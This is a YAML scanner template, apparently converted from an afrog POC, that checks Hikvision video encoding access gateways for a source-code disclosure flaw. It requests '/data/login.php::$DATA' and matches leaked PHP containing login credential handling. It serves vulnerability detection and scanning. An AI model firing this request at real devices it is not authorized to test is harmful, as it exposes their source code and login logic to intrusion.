# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - DataBaseQuery();
          - $_POST['userName'];
          - $_POST['password'];
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/data/login.php::$DATA'
id: hikvision-gateway-data-fileread
info:
  author: zan8in
  description: |
    HIKVISION 视频编码设备接入网关存在配置错误特性，特殊后缀请求php文件可读取源码
    title="视频编码设备接入网关"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: HIKVISION 视频编码设备接入网关 $DATA 任意文件读取
  severity: high
  tags: cve,cve2023,fileread,hikvision,argus-import
